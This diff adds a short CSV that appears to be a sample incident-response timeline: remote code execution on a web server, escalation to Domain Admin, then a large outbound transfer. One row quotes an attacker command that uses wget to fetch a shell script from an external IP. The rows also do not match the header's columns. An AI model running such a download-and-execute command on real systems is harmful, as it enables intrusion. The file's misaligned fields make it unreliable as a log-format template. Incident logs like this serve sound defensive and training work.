@@ -1,0 +1,4 @@
+Timestamp,Source IP,Event Type,Action,Description
+[2026-03-14T02:14:10Z],[203.0.113.47],[10.0.1.5],Initial Access,[Remote Code Execution,Attacker executed wget http://203.0.113.47/shell.sh on web-server-01]
+[2026-03-14T02:17:22Z],[10.0.1.5],[10.0.2.10],Lateral Movement,[Privilege Escalation,Account granted Domain Admin privileges on dc-01 as TITANCOMP\administrator]
+[2026-03-14T02:31:05Z],[10.0.2.10],[203.0.113.47],Exfiltration,[Anomalous Outbound Transfer,4.7GB outbound data transfer detected via Firewall logs]
